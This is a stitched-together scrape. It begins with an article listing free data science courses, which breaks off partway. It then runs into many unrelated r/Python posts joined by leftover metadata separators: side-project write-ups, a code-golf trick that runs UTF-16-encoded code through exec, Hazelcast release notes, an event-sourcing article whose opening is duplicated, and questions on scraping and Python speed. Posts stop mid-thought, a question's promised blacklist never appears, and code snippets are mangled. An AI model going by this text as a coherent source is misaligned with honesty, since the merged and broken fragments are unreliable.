If you people have any interest about **Data Science** or you have heard about Data Science and you want to know from where you can get the knowledge or can do the course of Data Science for free then read this carefully.

In this article we will tell you that from where you can get the free course of **Data Science** but first let me tell you little about Data Science.

## What is Data Science

I think you all people ever studied about the **statistics in your mathematics classes** in your Schools. yes, I am talking about those tables and the results that you got form that and then you predict various aspects on the basis of those results.

In those tables you people read the Data and then compute the results. If I talk about the small businesses there you have small amount of Data that you write on the **Excel** and then you will compute the results. **By those results you can calculate the growth of that business** or what the things are required to improve the business. But if I talk about the big businesses or the big firms Like Google , Apple or many others they have large amount of Data . **They can not compute that Data on Excel or can not gather information just by those traditional methods** . So , here **Data Science** comes in the pictures .

**Data Science is used to do the same task but in the modern way** and for the businesses that have the large amount of Data. By that Data, Company can do a lot of things but the one major thing is to improve their businesses statistics and the creativity they can generate for the growth . So, that's why there is a big need of Data Science .

### Work of a Data Scientist

There are various tasks that can be done in the **Data Science** :-1. Data cleaning:- **Data cleaning** is performed after we get the Data from a particular task . In Data cleaning we have a large amount of Data , So there will be inconsistency in the Data and other difficulties that a **Data scientist** has to solve and extract the right information to use.  
After this many other processes happen like Data loading where Data is loaded after the cleaning of Data then there Data processing happens to gather some useful information and visualize that . 

 

## Free Data Science Courses

On the web you will find various **Data Science courses** most of them are paid . There are some highly authorized platform like Coursera , Udemy , EDX etc.  
But if you want to learn it for free then you can check these that are mentioned below . The first platform is

### 1. Cognitiveclass.ai

Here you can learn various technical stuff like **Python, AI, Cloud, Blockchain** etc. So this is the first web platform where you can learn **Data Science for free.**

Here you will get the complete course of Data Science. On this platform you will see the Course name **Python for Data Science**. There you will get textual stuff for reading and there you will get videos to learn .

### 2. Kaggle

 **Kaggle is also a good platform to learn Data Science for free** in the image you can see the interface of website . Here you will get the various courses like **Deep learning , Machine learning , Artificial intelligence etc**. You can learn Data Science here for free , you can find various concepts to learn . There you will find some practical exercises to improve skill on the scale of practical implementation of Data Science.

I wanted to share a side project I worked on last year and some of what I learned while building it.

The site itself is called "My Name Fairy" [https://www.mynamefairy.com](https://www.mynamefairy.com). It's a Tinder for baby names.

https://preview.redd.it/ledjj149zwb61.png?width=1999&amp;format=png&amp;auto=webp&amp;s=27df2e05f9e525a74941e49c196e4a16437798ec

Here's a summary of the tech I used to build it:

* Django for BE
* Nginx for the webserver and serving static assets
* Postgres for the DB
* Vue.js in some places (The [card swiping page](https://www.mynamefairy.com/swipe-names) and [account page](https://www.mynamefairy.com/accounts/me))
* Plain js in other places
* Sass for the styles
* Webpack to build the FE
* Docker/docker-compose for deployment
* Deployed on a digital ocean droplet. The Postgres DB is also a managed DB from DO.
* Amazon CloudFront for a CDN

I mostly started it as a way to learn some new tech (specifically Postgres, Vue, Sass, Webpack, Docker, Nginx and deploying) and it's been great for that. It's also been fun to build something from the ground up. I've always come into a project that's already established. Having to make everyone decision from the beginning was empowering and let me play with tech I wouldn't get to otherwise.

Here are some classes I took:

* [Advanced CSS and Sass](https://www.udemy.com/course/advanced-css-and-sass/) by Jonas Schmedtmann. This class is *awesome*. Seriously, I can't recommend it enough. It's super thorough, uses great examples, and Jonas is a really talented teacher. If you want to brush up on CSS and Sass, this is a great way to go.
* [Vue The Complete Guide](https://www.udemy.com/course/vuejs-2-the-complete-guide/) by Maximilian Schwarzmller. This class is also really good. It's not quite as exhaustive as the Advance CSS one above, but it was really helpful in giving me a crash course in Vue for this project.
* [Docker and Kubernetes](https://www.udemy.com/course/docker-and-kubernetes-the-complete-guide/) by Stephen Grider. Similar to the Advanced CSS course, this one is *great*. It's super in-depth and Stephen is a really good teacher. I'd used Docker and Kubernetes a bit at work, but this class helped me get a much better handle on it. Related - [How Containers Work](https://jvns.ca/blog/2020/04/27/new-zine-how-containers-work/) by Julia Evans also helped me understand what's going on under the hood when we containerize an application.

And some lessons I learned along the way:

* Writing all the markup and styles is a great way to practice and to have the most flexibility, but it's also *time consuming*. For my next project I'd like to use more templates or FE frameworks to reduce the time I spend on that.
* Having someone else to work on the project helps a lot. My gf worked on this with me doing the design and all product related decisions which was a huge help. It was also nice in that we could parallelize the work. She could prioritize which feature we'd work on next and create the designs/figure out the user flows, and I could focus on just building the site.
* Postgres is a cool DB. I'd only used MySQL before, but I really like the data types that Postgres offers. Eg, I use the `uuid` datatype in a few places. I do find the `EXPLAIN` to be pretty intense and intimidating, but it also seems more powerful once you understand it.
* Vue is great. I used React/Redux at a previous company, but like how Vue's approach to using templates instead of JSX. It feels more light-weight than React and less of a jump from the traditional HTML/CSS/JS approach. I also like that it has a centralized store built in (Vuex), even though I didn't need that for the project.
* Setup Django to print your SQL queries! Seriously, this took me way too long to figure out. Yes, you can use Django Debug Toolbar, but that really only works if you're loading a page in the browser. If you're just hitting an API with Django Rest Framework or using a script, you won't see those queries. See [here](https://stackoverflow.com/a/20161527) for how to do it.
* Setting up Webpack is a *pain*. I probably spent 8 hours on getting it working for both my dev environment and production builds. I used [Django Webpack Loader](https://github.com/owais/django-webpack-loader) and found [this stackoverflow](https://stackoverflow.com/questions/57394214/django-webpack-how-to-serve-generated-webpack-bundles-with-webpack-dev-server) helpful for getting the dev server working. It is powerful, but it's finicky. Maybe you'll have more luck than me, but I found using Webpack really frustrating.
* Heroku is great for getting your project off the ground. Especially early in the project I was learning a ton of new stuff and was grateful I could let heroku just handle the deployments. Eventually I learned how to deploy my project on a digital ocean droplet (which was also a good learning experience), but in the beginning I'd definitely recommend just using Heroku so you can focus on the rest of the project.
* Using a CDN (like Amazon Cloudfront) is a great way to speed up your site's response times, especially if you're running it from a single server. If you're going this route, also make sure to set-up your FE asset builds so the files have a unique hash in their name so that whenever you make a change you don't have to worry about purging old files after a deployment.

And here's few other tools I used:

* Hotjar for seeing how people were using the site. This tool has been *indispensable*. We're just using the free version, but even with the limited recordings we learned so much about how to improve our user flows (and caught a few bugs) just by watching people use the site.
* [dbdiagram.io](https://dbdiagram.io/) was great for figuring out the schema for the project.
* TablePlus for working with the DB. In the past I've just used the command line, but having a GUI for looking at/interacting with the DB is really nice. It also helped me coming from MySQL since I was still learning the Postgres syntax and Tableplus helped abstract away those syntax concerns (kind of like Django's ORM does). It's a really nice tool.
* PyCharm as an IDE. I use the JetBrains IDEs at work (mostly using PHPStorm) and I really like them. Maybe it's just that I *know* them (which always helps). I know VSCode is free or there's tricked out vim set-ups you can use, but I'm happy to pay the money for PyCharm. It integrates well with Django and Vue and works well for me.

If you've never worked on a side project before (I hadn't), I'd say definitely do it! It's rewarding and you learn *a lot*. If anyone has any questions, happy to provide the answers I can. But seriously, go forth and build!

![video](g07v9kxckwb61)

Hi guys, I built a project that could take your baseball pitching clips and automatically generates the overlay.  

Source code: [https://github.com/chonyy/ML-auto-baseball-pitching-overlay](https://github.com/chonyy/ML-auto-baseball-pitching-overlay) 

I know some of you may have already seen it. However, I have made some improvements and I will want to share it.

* The model accuracy is hugely increased
* I implemented Polyfit to keep track of the ball just in case it lost the detection in some of the frames

After all, I'm happy to say that it now is able to overlay as many clips as you want!

The input pitching clip could be directly from your phone or camera. The release point will be automatically detected by the program. This system will trace the trajectory and align all the videos to generate the overlay.

A fine-tuned YOLOv4 model is used to get the location of the ball. Then, I implemented SORT tracking algorithm to keep track of each individual ball. Lastly, I have applied some image registration techniques to deal with slight camera shifts on each clip.

My next step is to build a web app on top of this project. The web app will have a user-friendly GUI for people who are not so familiar with programming to directly try it online! Feel free to follow this project. I should be able to finish it in the upcoming weeks!""|||Lunar Theme for VSCode|||Python|||1|||4|||1610892650|||""

One of the methods I am including in this class is to fill PDF form fields using a dictionary generated from a user supplied configuration file with the keys as the form fields and the values as user-supplied f strings.

I want these to allow calls to self variables/methods and list/dict comprehensions without allowing for any malicious code to run.

 I.e. I would like to allow users to call things like

 f"{self.var}"

f"{self.var[0]}"

f"{self.var['key']}"

f"{self.method()}"

f"{k} {v}" for k,v in self.var

Etc.

To prevent malicious activity I'm planning to open() the files prior to decoding them in a way that generates functional f strings. I plan to check if any substrings are present that could be part of malicious code. If any of the substrings are present, then the function will return an error/warning about a potentially malicious configuration file. Here are rhe things I can think of blacklisting:

Sometimes the code becomes completely unreadable, but it's bad for good if the code gets shorter.

Concerning Python, it is possible to encode the UTF-8 characters of the code into UTF-16 and then execute them. This has the effect of halving the size of the code, because one character of UTF-16 represents 2 of UTF-8.

&amp;#x200B;

Here's how to change a code to UTF-16:

`&gt;&gt;&gt; a="""print('Hello!')""""""""`

`&gt;&gt;&gt; print(a.encode().decode('utf-16'))`

``

&amp;#x200B;

And this code can be executed with:

`&gt;&gt;&gt; exec(bytes(' ','u16')[2:])`

`Hello!`

&amp;#x200B;

In this case, the code becomes longer because it is pretty short already, but if your code is 60+ chars, you actually shorten it!

The process of converting is pretty simple, but since Clash of code games can last around only one or two minutes, it's sometimes redundant to have to do the same thing over and over again.

&amp;#x200B;

So I've created a site, which will, using Python, generate this code for us.

Here is what it produces when given a longer input code than in the previous example:

I think it is cool, because the only dependency is numpy and you can actually see whats happens with your arrays, so nearly no blackboxing takes place. I mainly used numpy and with some tricks managed to stay  below 1.0 millisecond for most processors with a buffer size of 512, so you can actually use most of them in real-time with pyaudio.

Also, I released it under the MIT licence, so feel free to use it in any way you want.

  
There are quite a few effects I managed to implement and it is one of those resources I wish I had a year ago, just to see different fx in action in a simplified manner.

A quick mathematical rundown, under uniform partisan swing we alter the vote count by district until we flip districts from one party to the other. This generates a set of hypothetical election results (displayed by the red line). The blue dot in the plots shows the actual election result. In this way, we can analyse how the election might have gone. We are mostly interested in the point where we cross 50% seat share for the given party, we would expect in a fair election that a party should need to receive around 50% of the vote in this case.

I just wanted to share the guide I used to create my python package available on [GitHub](https://github.com/rajivsarvepalli/mock-alchemy) or [PyPI](https://pypi.org/project/mock-alchemy/).

I don't know if this guide has been shared before, but I found https://cjolowicz.github.io/posts/hypermodern-python-01-setup/ guide for a modern python
project very helpful. It's a guide on how to build a modern python project focused on simplicity and employs automated tools. It was helpful for me to get a basis in modern
python development, and helps give a short introduction to CI/CD pipelines. 

I believe there is even a [cookiecutter](https://github.com/cjolowicz/cookiecutter-hypermodern-python) project you can use to create a template of the ideas he walks through in the guide.
I have not used cookiecutter, but it looks interesting if you want a quick way to use a project template.

You can also look at my package of ways to use this sort of idea in actual implementation. My package is for mocking SQLAlchemy in python for unittesting; it's an upgraded fork of
the [alchemy-mock](https://pypi.org/project/alchemy-mock/) package since that one no longer seems supported.

Anyways, I would recommend checking out that guide if you are interested in creating your own python package that is somewhat complex. Even if your package is quite simple,
I think it is good practice to learn some of these tools for the ideas of CI/CD, testing, and consistent formatting.""|||Beginner Regression modeling extract data need help|||Python|||1|||2|||1610658256|||""[removed]""|||Beginner coding Regression modeling for data extraction|||Python|||1|||2|||1610658016|||""[removed]""|||I wrote a Twitter bot and now I look for inspiration to upgrade it to the next level.|||Python|||1|||0|||1610655068|||""Hi, I don't know if many of you use twitter but if you do you most likely has stumbled upon one of this accounts that posts X every X time. For example: [https://twitter.com/nyt\_first\_said](https://twitter.com/nyt_first_said) @NYT\_first\_said posts when a word has been used for the first time in the New York Times. Which, you know, is not the most useful thing to do but is fun to write it.

So, I decided to write one myself. The bot passes memes from a subreddit and post them to Twitter, quite simple I know. That's why I started to improve it.

Currently the bot has a the following features:

* Check if the image is smaller than 5MB (Twitter image limit)
* Video download  and check if it is smaller than 15MB and shorter than 2:20 mins (Twitter video limit)
* Check if is connected to WiFi in case the responses take too long
* Upload a copy of all the images downloaded to Google Drive once every X time.
* Options to download only images that follow a criteria: number of upvotes, flags, mods posts... etc.

As you see the bot (in my humble opinion) seems pretty complete. However I would like to get more from all of this and that is why I write all of this. Is there any feature you think could improve it? Or not improve it but rather that will be interesting to explore, currently I have around 10,000 images and videos which I think might do to train an AI to do... Something(?) (I have no clue on how to use AIs, maybe is time to learn if I can do something with all this).

The last idea I had, and the one I am trying to implement right now is to use text detection and search if are any words I can use to create another filter or analyze the text used in memes.

Anyhow, I thought that as people usually post the classical "100 coding ideas to do something new" it would be ok if I ask for inspiration on this matter.

So far, I only added two notebooks:

1. [Analyzing the German Vocabulary (since I am/was learning German)](https://nbviewer.jupyter.org/url/github.com/davidahmed/TJoP/blob/master/German%20Language%20Vocabulary/German_Vocab_Analysis.ipynb). The notebook is complete with loading the corpus, doing NLP with stable libraries, etc.

(Use the notebook as an inspiration, and not to just solve the challenges; it's your own loss if you do so).

In case you are new to Hazelcast, it is an open-source distributed in-memory data store and computation platform that provides a wide variety of distributed data structures and concurrency primitives. Hazelcast Python client is a way to communicate to Hazelcast clusters and access the cluster data. The client provides a Future-based asynchronous API suitable for wide ranges of use cases: [https://github.com/hazelcast/hazelcast-python-client](https://github.com/hazelcast/hazelcast-python-client)

You can install it via

    pip install hazelcast-python-client

The team has added great features, many enhancements and bugfixes with this major release. Here are the highlights:

* **Hazelcast IMDG 4.0 Changes**: Client protocol enhancements, architectural changes. 
* [CP Subsystem Support](https://hazelcast.readthedocs.io/en/stable/using_python_client_with_hazelcast_imdg.html#cp-subsystem): New concurrency APIs including AtomicLong, AtomicReference, FencedLock, Semaphore, and CountDownLatch. Hazelcast IMDG 4.0 introduces CP Subsystem powered by Raft consensus protocol. It provides CP concurrency primitives with respect to the CAP principle, i.e., they always maintain linearizability and prefer consistency to availability during network partitions and client or server failures. 
* [Backup Acknowledgment](https://hazelcast.readthedocs.io/en/stable/setting_up_client_network.html#configuring-backup-acknowledgment): Python client now supports backup acks (aka boomerang backups). So far the client was waiting for the sync backups to complete on the member. Boomerang backups decrease the number of network hops, thus improving the performance.
* [Performance](https://hazelcast.readthedocs.io/en/stable/using_python_client_with_hazelcast_imdg.html#performance): The performance of the client for the non-blocking mode is improved significantly.
* [Paging Predicates](https://hazelcast.readthedocs.io/en/stable/using_python_client_with_hazelcast_imdg.html#filtering-with-paging-predicates): Allows you to fetch keys, values, or entries of a map page by page is implemented.
* [Configuration Redesign](https://hazelcast.readthedocs.io/en/stable/client.html#hazelcast.client.HazelcastClient): Programmatic configuration was simplified. The configuration is now represented with keyword arguments. 
* **Ownerless Client**: Simpler design to track member leaves and joins to the cluster. 
* [Logging](https://hazelcast.readthedocs.io/en/stable/using_python_client_with_hazelcast_imdg.html#logging-configuration): The client was adding custom handlers to the loggers, which is not recommended by the standard library documentation. Custom handlers are now removed and other logging practices recommended by the standard library documentation are followed.""|||Python Websocket for Flutter app|||Python|||1|||2|||1610625834|||""[removed]""|||Benchmark on REAL mobile devices?|||Python|||1|||0|||1610624674|||""Hello everyone,

I am looking for an asyncio library to support multiple event loop, each per thread/process. Typical use case should be: Asyncio web crawler, in which there are multiple threads/processes, each runs an independent event loop to crawl remote data and does some processing. Given that the data is small enough, but there are a lot of them and time to process data is roughly equivalent to time to read it from server.

I thought of using separate executor poll to process data, so the asyncio event loop only needs to take care of reading data, but because the processing job is similar to executor poll, so using threaded executor poll may be hit by GIL. If using process executor poll, passing data between process via \`multiprocessing \`pipe/queue causes extra over head. More over, I want to have some interaction between event loops, like submitting a task to different event loops and await for its response. So I think having multiple processes, each process runs one event loops should fit the bill.

The closest one I found is Pulsar [https://quantmind.github.io/pulsar/design.html](https://quantmind.github.io/pulsar/design.html), but seems inactive for now.

TLDR I would like to have multiple event loops, each one runs on a separated thread/process and can communicate between each other. Please let me know if there is anything like this.

Thanks.

After a monumental list of things I could learn on my days off, learning to code seemed the most viable option given how much information you can access online. 

So I decided to start on YouTube with a few tutorials, 
Big up Mosh Hamedani! If like me, youre brand new to coding, the 6 hour beginner python tutorial seems a great place to start. After this I took advantage of the incredible sale on udemy and bought, Automate the boring stuff with python programming, The python bible and 2021 complete python boot camp from zero to hero. 

After getting to the halfway point on the 2021 python bootcamp I began to hit a brick wall, not because the course isnt good but more than likely overkill! This is when I discovered the mimo app and honestly Im blown away by it can literally pick my phone up and start solving coding problems, so if youre a newbie like me maybe it can work for you too!

Sorry Ive waffled a lot!

### Introduction

&gt;*The experience of seeing a log dump next to a bug report, pointing a new test case at the log, calling a single function to reproduce the exact state of the world at the time of the error, and being able to introspect everything, as well as step forwards and backwards through time, is special.*

When Nick and I started working on OddSlingers in 2016, we wanted to build something cutting-edge, and had been recently influenced by some of the functional programming advocates wed become friends with at the [Recurse Center](http://www.recurse.com/).

Wed also read Jay Kreps wonderful article, [The Log: What every software engineer should know about real-time datas unifying abstraction](https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying), and learned to [turn the database inside out](https://www.confluent.io/blog/turning-the-database-inside-out-with-apache-samza/) from Martin Kleppman. We had witnessed the rise of [Redux](https://redux.js.org/) as Reacts state-management saviour, and couldnt wait for the gods of code to hand us our DeLoreans for [time-travel debugging](https://medium.com/the-web-tub/time-travel-in-react-redux-apps-using-the-redux-devtools-5e94eba5e7c0). And lets not forget the blockchain[\[1\]](https://monadical.com/posts/event-driven-architecture-1.html#fn1)!

Seeing the benefits of this approach, we set out to build our game platform using an event-driven architecture (also known as log-structured or [event sourcing](https://martinfowler.com/eaaDev/EventSourcing.html)). But that doesnt mean we got to work installing Kafka and Samza; you dont need any heavy frameworks or tools to reap the benefits of event-driven architecture. In fact, we ended up storing our Django models and event logs in the same postgres database!

It just means we built our codebase around the idea that we should have a single event stream, that we should store it in a log, and that all application states should be reproducible given a starting state and that log.

Once we got some reasonable abstractions figured out, having an event-driven architecture was a thing of beauty. The experience of seeing a log dump next to a bug report, pointing a new test case at the log, calling a single function to reproduce the exact state of the world at the time of the error, and being able to introspect everything, as well as step forwards and backwards through time, is special. For gnarly, complicated code full of interdependent state transitions and edge cases (like, say, game logic), it can feel almost blissful.

But there were downsides to this decision too, and I hope our journey will show both the benefits and drawbacks of event sourcing.

### Event-Driven Architecture

Lets start with a very quick explanation of what event-driven architecture is.

Its an architecture based on one core idea: any given state can be defined as a starting state and a series of changes applied to that starting state in succession. We call such a change an event, and given a starting point and a log of events, you can always reproduce any state at any time in history.

For example, lets imagine (in some hypothetical world) that you are building a poker platform. You might start with a database with a [schema](https://en.wikipedia.org/wiki/Database_schema), things like User  
, Player  
, PokerTable  
, etc. And that database would start out empty. Then some people sign up. They sit at a table, and play some hands of poker.

In a typical architecture, each of those actions (people sign up, sit at a table, play some hands) are defined by a series of requests over some protocol (e.g. HTTP), and each results in the modification of the database state (e.g. the addition of a row in the User  
 table). The event-driven approach sees the series of changes to the database as the fundamental source of truth. This means that, given a snapshot of a database in some state, we can produce all future states.



*A starting state, log, and current state.*  
*State change in event-driven architecture is linear and deterministic! If there was a bug that happened when the second player sat, we can fire up a test database, point our codebase at it, and dispatch the first two events to reproduce it.*

Heres a simplified version of what our architecture ended up looking like[\[2\]](https://monadical.com/posts/event-driven-architecture-1.html#fn2):



*A hierarchical, linear architecture is easy to follow! The controller process is where the magic happens, and Ill be going into much more detail about how that works in the next section.*

There are some notable advantages to this approach:

* If the state of my database ends up broken somehow (e.g. because of a logical error), I can go back in time and figure out how it got that way.
* If I want to add another kind of data store, I can keep their states consistent by keeping both dependent on the same event history.
* Creating a realistic simulation of production conditions for testing or research purposes becomes just a matter of pouring an actual historical log into a test database or service.
* It creates a clear hierarchical flow of state dependency, which massively reduces the number of things developers have to reason about in any one part of the codebase.

Theres a lot of overlap with ideas from [functional programming](https://en.wikipedia.org/wiki/Functional_programming), and our ideas were influenced by [Rich Hickey](https://www.infoq.com/presentations/Simple-Made-Easy/) and [Gary Bernhardt](https://www.destroyallsoftware.com/talks/boundaries). Indeed, taking as much advantage as possible of pure functions, while isolating side effects (e.g. in our use of Subscribers  
), was a core goal of our design.

### Models, Events, Dispatch

Armed with the why, lets take a look at how our backend, which was built with the [Django](https://www.djangoproject.com/) framework, applied the principles of event-driven architecture. We chose Django because its a robust, battle-tested web framework, and because it manages to have nice ergonomics without excessively leaning on metaprogramming magic[\[3\]](https://monadical.com/posts/event-driven-architecture-1.html#fn3). Also, its migration system is a really nice feature for the long-term health of a project.



*The* *Controller*  
*s* *dispatch()*  
 *cycle determines how a given* *Action*  
 *modifies application state, and then* *commit()*  
*s that action and its state changes to the database.*

In a typical Django project, getting Models  
 (which define a database schema for Djangos ORM) right is a good first step. The Model  
 objects will represent an in-memory, pythonified cache of the state in our database. We also defined a set of Events  
, which would effectively be the model layers API, which would eventually be overshadowed by Actions  
 (mirroring redux  
 again), which effectively defined the applications API.

Once some Models  
 are defined (Player  
, PokerTable  
[\[4\]](https://monadical.com/posts/event-driven-architecture-1.html#fn4), Deck  
, ), we need a way for incoming http requests to result in changes to them. So incoming requests, after hitting nginx and getting queued via Django-channels, are picked up by a worker process[\[5\]](https://monadical.com/posts/event-driven-architecture-1.html#fn5), and passed into a Controller  
, which handles all business (or game, in this case) logic.

The entrypoint into the Controller  
 is the dispatch()  
 function (so named to follow redux  
; more on our frontend in part 2). It passes the incoming data around through a series of functions that come up with a list of modifications to make to the in-memory Models  
.

It then passes those Events  
 to the internal\_dispatch()  
, which handles Subscribers  
 and applies the changes to Models  
. Subscribers  
 handle side effects (for example, computing an animation to send to the frontend) and can produce Events  
 of their own, to be grouped up with those produced earlier by the subevent\_generator  
. Finally, all of those Events  
 are processed: each one applies its designated change to its designated Model  
.

When theyve all been updated, a single commit()  
 is executed. By batching all the writes until the end of the event lifecycle, we could make sure that all of the data changes would occur atomically without needing to lock for excessive amounts of time.

Note that we called the low-level changes to the database Events  
, and later added a higher-level layer called Actions  
 (to mirror [Redux Actions](https://redux.js.org/tutorials/fundamentals/part-2-concepts-data-flow#actions); Ill go more into that in part two). The Action  
/Event  
 dichotomy isnt totally necessary[\[6\]](https://monadical.com/posts/event-driven-architecture-1.html#fn6), and its there in part because we didnt quite get the level of abstraction right[\[7\]](https://monadical.com/posts/event-driven-architecture-1.html#fn7) when we designed our events in the first place. After defining Events  
 in terms of logical units of change to Models  
, we found a level of abstraction that sat atop it (equivalent to an API) was easier to work with. We didnt want to change existing Events  
, because it would involve overhauling the whole codebase. I believe that this is the one real downside of event-driven architecture: changing your event model down the road is very tricky!

### Walking Through an Example

Lets walk through what happens when a player goes all-in[\[8\]](https://monadical.com/posts/event-driven-architecture-1.html#fn8), to illustrate what this looks like in practice. And just to note: this is a simplification of how our code actually works, because it would be unwieldy to have to explain every abstraction we use in our codebase[\[9\]](https://monadical.com/posts/event-driven-architecture-1.html#fn9).

At this point, were assuming that a request has been passed through the websocket handlers and popped off the process queue, and is about to be passed into the dispatch()  
 function of the Controller  
:

    controller.dipatch(     'RAISE_TO',     amt=100,     all_in=True,     player_id=example_player.id, ) 
    # simplified excerpt from file controllers.py class GameController: # ... def dispatch(self, action_name: str, **kwargs) -&gt; None:         subevent_generator = getattr(self, action_name.lower(), None)         events = subevent_generator(**kwargs)          self.log.write_action(action_name, **kwargs)         self.internal_dispatch(events)                  self.commit(should_broadcast=action_name in PUBLIC_ACTIONS) 

There are a few steps here:

* The subevent\_generator  
, in this case, is the function raise\_to  
 on the controller, which will return a list of (subj  
, event  
, kwargs  
) tuples, which will define the list of changes that will be made to the gamestate.
* subj  
 is a database model (such as a Player  
 object).
* event  
 is an Enum  
 such as Event.UPDATE\_STACK  
.
* kwargs  
 are whatever that event needs to resolve, such as {'amt'=0}  
.
* Next, the action is added to the historical log, which will make it possible to do things like time-travel debugging later on. We ended up using the same structure as a subscriber for the log, and it, like the other subscribers, writes to the same postgres database as everything else. A log might look like this:

&amp;#8203;

    "actions": [     {         "subj": "cowpig",          "action": "RAISE_TO",          "args": {"amt": 100}     },     {         "subj": "pirate",         "action": "FOLD",         "args": {}     },     #  many more actions ] 

* Then the EventList  
 is passed into internal\_dispatch  
, which makes the changes to the relevant models, and also passes the EventList  
 to any subscribers[\[10\]](https://monadical.com/posts/event-driven-architecture-1.html#fn10) that are listening (for example the NotificationSubscriber  
, which decides when to send notifications). That function essentially looks like this:

&amp;#8203;

    # simplified excerpt from file controllers.py class GameController: # ... def internal_dispatch(self, events: EventList) -&gt; None: for subj, event, kwargs in events:             event_func = getattr(subj, event)             event_func(**kwargs)             for sub in self.subscribers:                 sub.dispatch(subj, event, **kwargs) 

* Finally, commit()  
 wraps up all the changes in Djangos transaction.atomic()  
, to make sure that either all of the changes to the game are made, or none are. Under the hood, thats wrapping up all of our changes into an atomic (set of) SQL command(s) to commit our event history and in-memory model changes to permanent storage:

&amp;#8203;

    # simplified excerpt from file controllers.py class GameController: # ... def commit(self, should_broadcast=True) -&gt; None: with transaction.atomic():              for model in self.models:                 model.save()              for sub in self.subscribers:                 sub.commit()          if should_broadcast:             self.broadcast_to_sockets() 

And there we go! Now we have both a current state of the world, defined in the database, and a history of how we got there.

This allows us to do some wonderful things in debugging and in testing. For example, any time a user reports an error, we just need the point in the history where it happened. Then we can create a test case that reproduces the error exactly. This stood out more than anywhere else in our simulation tests, where we play out games with random actions, and test a ton of invariants. Any time something looks wrong, the test dumps the hand history to a file, and a test case can be automatically created, ready to be fixed!

    # simplified excerpt from file test_simulation.py class BotTest(SixPlayersTest): def simulate_hand_and_test_assumptions(self, controller, stupid_ai):         curr_hand = controller.accessor.table.hand_number          while acc.table.hand_number == curr_hand:             action, kwargs = get_robot_move()             controller.dispatch(action, **kwargs)             try:                 self.assert_consistent_pot_size(controller)                 self.assert_animation_invariants(controller)                 # ...many more except Exception as error:                 self.controller.log.save_to_file(                     'test.json', notes=str(error)                 )                 raise type(error)(msg).with_traceback(err.__traceback__) 

With the error log, we could pass it into a Replayer, and step through the error with ipdb  
.

#### Lessons Learned

Phew! Now that weve had a peek into what the architecture looked like, lets look at the pros and cons of having chosen to build our platform with an event-driven architecture.

* **Major positive**: simulation/fuzz testing saved us an enormous amount of time long-term. Once wed gotten to the point where we could reliably simulate millions of hands of poker without seeing errors, we didnt see many problems in production either.
* **Positive**: our replayer made debugging a lot easier, but Id say that, in practice, the replayer itself had bugs in it, which meant that it wasnt quite as incredible a tool as it could have been. It did, however, encourage us to design our code in a way that made it easy to introspect, as we spent a lot of time in ipdb  
, viewing event logs and calling the describe()  
 function that we habitually defined on any object of significant complexity.
* **Negative**: we chose a level of abstraction that was a bit too low at first, and changing the event model is nothing to sneeze at. On top of the usual headaches that come with refactoring core models in a codebase, changing an event also invalidates all previous historical logs that used that event! So instead of ruining all logs, we built an Action -&gt; Event  
 hierarchy, and then replayed the Actions  
 in a history to produce an updated Event  
\-level history when those had to be changed[\[11\]](https://monadical.com/posts/event-driven-architecture-1.html#fn11). We managed not to have to change the Actions  
 almost ever, because by the time we designed them we understood our problem space better, and the Actions themselves were almost directly the vocabulary of a poker game (e.g. raise  
, call  
, fold  
).

Overall, I feel confident that the positives outweigh the negatives, though I do wish we had taken the time to rewrite the game engine early on, when we realized that we should have used a slightly higher-level set of Events  
.

Thats all for the backend. Next time Ill talk about the frontend, where we realized that animations, which need to quickly transform state over time, threw a new curveball into the designone that eventually led us to building a [custom animations library](https://github.com/Monadical-SAS/redux-time)!""|||Convert colourful image to Gray , Black and White using Python|||Python|||1|||0|||1610392037|||""[https://youtu.be/vBiyzxh0NWY](https://youtu.be/vBiyzxh0NWY)""|||Scraping Facebook in 2021 [What's the best practice?]|||Python|||1|||4|||1610389676|||""I'm scraping Facebook using Selenium and Webdriver (gecko drive) for Firefox using the mbasic.facebook.com and m.facebook.com (even though I'm having Desktop User-Agent).

Wed also read Jay Kreps wonderful article, [The Log: What every software engineer should know about real-time datas unifying abstraction](https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying), and learned to [turn the database inside out](https://www.confluent.io/blog/turning-the-database-inside-out-with-apache-samza/) from Martin Kleppman. We had witnessed the rise of [Redux](https://redux.js.org/) as Reacts state-management saviour, and couldnt wait for the gods of code to hand us our DeLoreans for [time-travel debugging](https://medium.com/the-web-tub/time-travel-in-react-redux-apps-using-the-redux-devtools-5e94eba5e7c0). And lets not forget the blockchain[\[1\]](https://monadical.com/posts/event-driven-architecture-1.html#fn1)!

Seeing the benefits of this approach, we set out to build our game platform using an event-driven architecture (also known as log-structured or [event sourcing](https://martinfowler.com/eaaDev/EventSourcing.html)). But that doesnt mean we got to work installing Kafka and Samza; you dont need any heavy frameworks or tools to reap the benefits of event-driven architecture. In fact, we ended up storing our Django models and event logs in the same postgres database!

It just means we built our codebase around the idea that we should have a single event stream, that we should store it in a log, and that all application states should be reproducible given a starting state and that log.

Once we got some reasonable abstractions figured out, having an event-driven architecture was a thing of beauty. The experience of seeing a log dump next to a bug report, pointing a new test case at the log, calling a single function to reproduce the exact state of the world at the time of the error, and being able to introspect everything, as well as step forwards and backwards through time, is special. For gnarly, complicated code full of interdependent state transitions and edge cases (like, say, game logic), it can feel almost blissful.

But there were downsides to this decision too, and I hope our journey will show both the benefits and drawbacks of event sourcing...

My understanding is that python shines as an easy to write, easy to read language with an awesome set of libraries that make it useful for just about anything. 

The caveat (again as I understand it) is that python performs best in single threaded and synchronous runtimes. You have solutions for both, but some libraries lack support and unless you know what you're doing, you may be better off with technologies that natively support such requirements - which is where I see some folks preferring Go or Node, for example. 

I also strongly suspect that a lot of bottlenecks attributed to 'Python being slow' could well be solved with better engineered solutions or more efficient code, the implication being it's much less about Python being the issue as the developer.

I wanted to ask the community here what they feel about this? How realistic is the notion that python is a slow language, in real-world applications? How often is python the actual bottleneck, versus the implementation of python?

Every linux ever has Python by default and a vast majority of programs depend on it. 


But I've recently dabbled in some C, and I learned about what compiled and what interpreted languages are. Many of my friends are "true" programmers who will make sure to tell you that Python is a "scripting" language (in a condescending manner).

So I want to know why it is so popular if: 

- it is an interpreted language whose static executables aren't even binaries, but collections of .py files and the interpreter
- it is a lot slower than compiled languages because it basically runs the code twice at least
- the most popular libraries are just as ancient as C libraries



I don't think I have any other "bad" arguments. The good ones for me personally is that:

- it is a good, understandable, sometimes vertically challenged syntax, with modern and good solutions (though I wish the for loop was normal because I can never get used to it)
